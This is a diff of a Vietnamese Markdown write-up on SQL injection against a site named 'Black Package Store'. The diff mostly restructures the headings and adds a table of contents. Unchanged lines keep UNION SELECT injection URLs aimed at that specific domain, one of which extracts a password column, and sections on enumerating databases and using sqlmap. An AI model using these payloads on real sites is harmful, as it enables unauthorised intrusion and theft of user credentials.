@@ -1,11 +1,16 @@
 # TỔNG QUAN # 
 Kiểm tra trên web "Black Package Store" `https://blackpackagestore.com/product.php?id=72`
 
-# CÁC BƯỚC
+## CÁC BƯỚC
+
+* [Dò tìm số cột](#dò-tìm-số-cột)
+* [Kiểm tra database, version, user](#kiểm-tra-database-version-user)
+* [Trích xuất cơ sở dữ liệu](#trích-xuất-cơ-sở-dữ-liệu)
+* [Sử dụng `sqlmap`](#sử-dụng-sqlmap)
 
 ![image](https://github.com/user-attachments/assets/df34c6d3-c54f-4b61-a8d8-c942b15b4122)
 
-# Dò tìm số cột
+## Dò tìm số cột
 
 ![image](https://github.com/user-attachments/assets/f1267547-fce3-4a83-8b3a-c647b831057b)
 
@@ -15,7 +20,7 @@ Kiểm tra trên web "Black Package Store" `https://blackpackagestore.com/produc
 
 ![image](https://github.com/user-attachments/assets/3d4a301c-ba81-467e-a6a6-8014fc79e6f1)
 
-# Kiểm tra database, version, 
+## Kiểm tra database, version, user 
 
 https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 
@@ -27,7 +32,7 @@ https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,5,6,7,8
 
 ![image](https://github.com/user-attachments/assets/9ea8ba0d-4071-424b-98bb-1dde03b22b6f)
 
-# Trích xuất cơ sở dữ liệu
+## Trích xuất cơ sở dữ liệu
 
 **1. Liệt kê các database**
 
@@ -56,7 +61,7 @@ https://blackpackagestore.com/product.php?id=72+UNION+SELECT+1,2,3,user_password
 
 ![image](https://github.com/user-attachments/assets/21f2d6bf-6f0e-40b0-a00e-1d82d634f08e)
 
-# Sử dụng `sqlmap`
+## Sử dụng `sqlmap`
 
 **1. Trích xuất database:**
 
